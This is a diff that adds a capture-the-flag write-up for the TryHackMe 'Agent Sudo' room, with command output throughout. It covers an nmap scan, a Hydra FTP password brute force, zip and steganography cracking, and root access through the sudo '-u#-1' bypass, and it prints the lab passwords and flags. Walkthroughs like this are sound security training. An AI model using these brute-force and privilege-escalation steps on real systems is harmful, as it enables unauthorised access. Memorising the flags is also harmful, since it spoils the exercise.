@@ -1,0 +1,450 @@
+Sudo agent 
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+                                                                              #NOTE :- 
+#1  the text in
+    '''
+    '''
+    are eiter ans or command executed on linux along with its out put 
+#2  in this type of syntax 
+  ┌──(kali㉿kali)-[~/sudoagent]
+  └─$ cat To_agentJ.txt
+
+    the text after $ is your actual command,in this case  ("cat To_agentJ.txt") 
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+#Task 1
+
+'''
+no answer needed 
+''' 
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#Task 2
+
+
+# namp  scan :- 
+
+'''
+nmap -sC -sV   -Pn 10.10.189.68 -A
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-04 02:45 EDT
+Nmap scan report for 10.10.189.68
+Host is up (0.16s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
+|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
+|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Annoucement
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.94 seconds
+'''
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+#Q1 How many open ports?
+
+'''
+Ans :- 3
+'''
+
+#Q2 How you redirect yourself to a secret page?
+The web page says that you have to get to the secret page with a code name as user
+that means we can change the value of the user agent to get access to the page 
+
+'''
+Ans :- user-agent 
+'''
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+#Q3 What is the agent name?
+
+if request were made with changing user agent values then you can get mulitple responses i tried switching the user agent to R with curl you can do it with burp 
+too, got this response
+
+'''
+What are you doing! Are you one of the 25 employees? If not, I going to report this incident
+<!DocType html>
+<html>
+<head>
+        <title>Annoucement</title>
+</head>
+
+<body>
+<p>
+        Dear agents,
+        <br><br>
+        Use your own <b>codename</b> as user-agent to access the site.
+        <br><br>
+        From,<br>
+        Agent R
+</p>
+</body>
+</html>
+
+'''
+
+which means there are total 25 users or agents and in theory or reality there are 26  alphabet i tried from A to b didnt got anything much but on C i got this 
+
+'''
+Attention chris, <br><br>
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
+
+From,<br>
+Agent R 
+
+'''
+that answers teh question : - chris
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+# Task 3 
+
+Q1 FTP password
+so accoring to taks 2 chris has a week  password so we can brute force it with hydra, I used hydra with rockyou and got this 
+'''
+command :- 
+hydra -l chris -P /usr/share/dirb/wordlists/rockyou.txt   10.10.189.68 ftp
+
+'''
+'''
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-04 03:21:50
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ftp://10.10.189.68:21/
+[STATUS] 240.00 tries/min, 240 tries in 00:01h, 14344158 to do in 996:08h, 16 active
+[21][ftp] host: 10.10.189.68   login: chris   password: crystal
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-04 03:22:55
+'''
+
+And that gives the answer as :- crystal
+'''
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+#Q2 Zip file password
+
+After login as christ in FTP i got some files i downloaded them and one of the text file said this
+'''
+┌──(kali㉿kali)-[~/sudoagent]
+└─$ cat To_agentJ.txt
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+'''
+The rest files where png and a jpg file so i used steghide but it demanded for a passphrase so decidec to use john on those files 
+john gave me this 
+
+'''
+┌──(kali㉿kali)-[~/sudoagent]
+└─$ john   -w=/usr/share/dirb/wordlists/rockyou.txt   cutie.png 
+Warning: invalid UTF-8 seen reading cutie.png
+Warning: detected hash type "HMAC-SHA256", but the string is also recognized as "HMAC-SHA512"
+Use the "--format=HMAC-SHA512" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:02 DONE (2023-08-04 03:27) 0g/s 5559Kp/s 5559Kc/s 5559KC/s "chido"..*7¡Vamos!
+Session completed
+
+'''
+
+which was a useless approach by me 
+
+The Question says that there is a zip file so i tried using Binwalk which did extracted the cuite.png file but not the other image file 
+this is what i got from binwalk 
+
+
+'''
+┌──(kali㉿kali)-[~/sudoagent]
+└─$ binwalk -e cutie.png     
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+
+WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+
+'''
+
+The extracted folder conatained a zip file and teh above reponse says that the zip file 8072.zip was encrypted so we can use Zip2john to get the hash to a hash file 
+'''
+┌──(kali㉿kali)-[~/sudoagent/_cutie.png.extracted]
+└─$ zip2john 8702.zip > zip.hash
+'''
+then i again used john to extract the data form the encrypted hash and got the password 
+'''
+┌──(kali㉿kali)-[~/sudoagent/_cutie.png.extracted]
+└─$ john  zip.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
+Cost 1 (HMAC size) is 78 for all loaded hashes
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+alien            (8702.zip/To_agentR.txt)     
+1g 0:00:00:01 DONE 2/3 (2023-08-04 03:38) 0.9174g/s 41715p/s 41715c/s 41715C/s 123456..ferrises
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+'''
+
+
+That gives us the zip file passwrod which we can use to extract the zip file with that passwrod but the command "unzip" created some error but later tryign some other commands i found this 
+
+
+'''
+┌──(kali㉿kali)-[~/sudoagent/_cutie.png.extracted]
+└─$ 7z e 8702.zip 
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 3 3200G with Radeon Vega Graphics     (810F81),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 280 bytes (1 KiB)
+
+Extracting archive: 8702.zip
+--
+Path = 8702.zip
+Type = zip
+Physical Size = 280
+
+    
+Would you like to replace the existing file:
+  Path:     ./To_agentR.txt
+  Size:     0 bytes
+  Modified: 2019-10-29 08:29:11
+with the file from archive:
+  Path:     To_agentR.txt
+  Size:     86 bytes (1 KiB)
+  Modified: 2019-10-29 08:29:11
+? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? yes
+
+                    
+Enter password (will not be echoed):
+Everything is Ok    
+
+Size:       86
+Compressed: 280
+
+
+'''
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+#Q3 steg password
+
+Now teh previous txt file which was emplty gets some data and this is what it says 
+
+'''
+┌──(kali㉿kali)-[~/sudoagent/_cutie.png.extracted]
+└─$ cat To_agentR.txt 
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+          
+'''
+
+
+
+the quated text seems encrypted i used chyberchif which said its base64 after decoding it i got the passphrase for the Other image file so i used it with steghide and got this 
+as answer 
+
+'''
+Pass phrae :- Area51
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+#Q4 Who is the other agent (in full name)?
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+#Q5 SSH password
+
+
+
+
+
+┌──(kali㉿kali)-[~/sudoagent]
+└─$ steghide extract -sf cute-alien.jpg                            
+Enter passphrase: 
+wrote extracted data to "message.txt".
+
+....
+
+
+
+Got a new file and after reading i go this 
+
+
+'''
+┌──(kali㉿kali)-[~/sudoagent]
+└─$ cat message.txt  
+Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+'''
+
+This gives us the SHH  password as  : - hackerrules!
+and user as :- james
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+#Task 4 
+
+# Q1 What is the user flag ?
+I simpely ssh to the james user with the obtained password and found the flag along with a imgae 
+
+'''
+james@agent-sudo:~$ ls
+Alien_autospy.jpg  user_flag.txt
+'''
+
+got the flag and answred the user flag question 
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+# Q2 What is the incident of the photo called? 
+for this question i was suposed to get the image on my Machine to have a look at it fro which is used the python simple httpserver method 
+
+''''
+
+#ON JAMES(TARGET) MACHINE:-
+
+james@agent-sudo:~$ python3 -m http.server 9000
+
+'''
+'''
+#ON MY MACHINE :-
+
+┌──(kali㉿kali)-[~/sudoagent]
+└─$ wget http://$IP:9000/Alien_autospy.jpg 
+'''
+
+now to answer this question i googled it a lot for this image using the image search option,But i had a guess that the secind and third wrords are 
+'''
+Alien autospy
+'''
+i was trying to look for the first word and found that it was the name of the place where this incident happende 
+'''
+roswell
+'''
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+#TASK 5
+
+Q1 CVE number for the escalation  (Format: CVE-xxxx-xxxx)
+
+so now it was suppose to get access of root so i used sudo -l to see what command are allow to run by james with sudo options
+the output i got made my way to root easy 
+'''
+james@agent-sudo:~$ sudo -l
+[sudo] password for james: 
+Sorry, try again.
+[sudo] password for james: 
+Matching Defaults entries for james on agent-sudo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+'''
+
+So after googling an expoit for this command "(ALL, !root) /bin/bash" i found the CVE along with all the instructions to execute
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+# Q2 What is the root flag?
+
+now let get the root access
+according to the CVE explanation is was just suppose to run this command 
+
+'''
+james@agent-sudo:~$ sudo -u#-1 /bin/bash
+root@agent-sudo:~# 
+'''
+now we are root lets cd too root and get the flag 
+
+'''
+root@agent-sudo:~# cd /root
+root@agent-sudo:/root# ls
+root.txt
+root@agent-sudo:/root# cat root.txt
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+b53a02f55b57d4439e3341834d70c062
+
+By,
+DesKel a.k.a Agent R
+root@agent-sudo:/root# 
+'''
+this will answer your last question too 
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+Thank you <3
+
